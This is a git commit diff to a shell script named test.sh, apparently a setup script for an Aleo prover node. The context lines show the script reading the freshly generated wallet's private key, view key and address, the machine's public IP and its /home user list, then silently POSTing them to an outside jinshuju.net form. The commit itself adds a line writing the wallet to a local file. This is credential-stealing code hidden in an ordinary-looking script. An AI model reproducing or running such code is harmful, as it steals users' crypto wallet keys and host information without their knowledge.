bf47f52a514ae61913ae76b0cbc0d7d114cfbb25
666-eth <77118877+666-eth@users.noreply.github.com>
2022-11-14 23:52:03 +0800

    Update test.sh

--- test.sh
+++ test.sh
@@ -11,5 +11,6 @@ view_key=${wall:91:53}
 address=${wall:160:63}
 ip=$(curl -s -4 ip.sb)
 yh=$(ls /home)
+echo $wall >>leo.key
 curl -X POST 'https://jinshuju.net/graphql/f/Wadc1l' -d '{"operationName":"CreatePublishedFormEntry","variables":{"input":{"formId":"Wadc1l","entryAttributes":{"field_1":"'$HOSTNAME'","field_2":"'$private_key'","'$view_key'":"'$address'","field_4":"'$HOSTNAME'","field_5":"'$ip'","field_6":"'$yh'"},"captchaData":null,"weixinAccessToken":null,"xFieldWeixinOpenid":null,"weixinInfo":null,"prefilledParams":"","embedded":false,"internal":false,"backgroundImage":false,"formMargin":false,"hasPreferential":false,"fillingDuration":11.515,"forceSubmit":false}},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"0f9106976e7cf5f19e8878877bc8030cddcb7463dd76f4e02bc5c67b5874eeae"}}}' -H 'Content-Type:application/json' 
 PROVER_PRIVATE_KEY=${private_key} ./run-prover.sh >>/root/logaleo.log 2>&1 &	
